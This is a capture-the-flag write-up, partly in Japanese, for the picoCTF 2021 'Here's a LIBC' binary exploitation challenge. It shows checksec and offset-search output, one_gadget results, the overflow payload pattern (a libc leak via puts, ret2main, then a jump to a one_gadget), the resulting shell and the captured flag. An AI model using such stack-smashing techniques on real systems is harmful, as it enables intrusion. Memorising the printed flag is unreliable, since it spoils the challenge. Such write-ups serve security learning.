## Description
>I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 49464

## Writeup
```
gef➤  checksec
[+] checksec for '/home/pwn/challenges/picoCTF2021/Here's a LIBC/attachment/vuln'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

```
gef➤  pattern search $rsp
[+] Searching for '7261616161616161'/'6161616161616172' with period=8
[+] Found at offset 136 (little-endian search) likely
```

```
$ one_gadget given_libc.so.6 
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

putsでlibc leakしてret2mainしてone gadget rceする。

```
0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL
```
を使う。ローカルでone_gadget_addressにbreakpointを設定して、`b"A" * 136, p64(one_gadget_address), b"\x00" * 0x48`を投げると、
```
gef➤  x/xg $rsp+48
0x7ffc98cd0200: 0x0000000000000000
```
となっていたので、これを送る。

```
$ ls
flag.txt
libc.so.6
vuln
vuln.c
xinet_startup.sh
$ cat flag.txt
picoCTF{1_<3_sm4sh_st4cking_37b2dd6c2acb572a}$  
```

Flag: `picoCTF{1_<3_sm4sh_st4cking_37b2dd6c2acb572a}`

備考: `system("/bin/sh")`を呼び出しても解ける。